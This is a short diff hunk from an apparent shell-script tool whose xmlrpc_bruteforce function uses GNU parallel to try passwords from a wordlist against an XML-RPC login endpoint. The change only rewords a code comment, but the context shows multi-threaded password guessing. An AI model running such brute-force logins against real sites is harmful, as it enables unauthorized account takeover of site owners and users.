@@ -40,7 +40,7 @@ xmlrpc_bruteforce() {
     local wordlist="$3"
     local max_threads="$4"
 
-    # Use parallel to iterate through wordlist and login with maximum of 20 threads
+    # Use parallel to iterate through wordlist and try to authenticate with multiple threads
     parallel --max-args=1 --jobs $max_threads xmlrpc_login "$endpoint" "$username" {} :::: "$wordlist"
 }
 
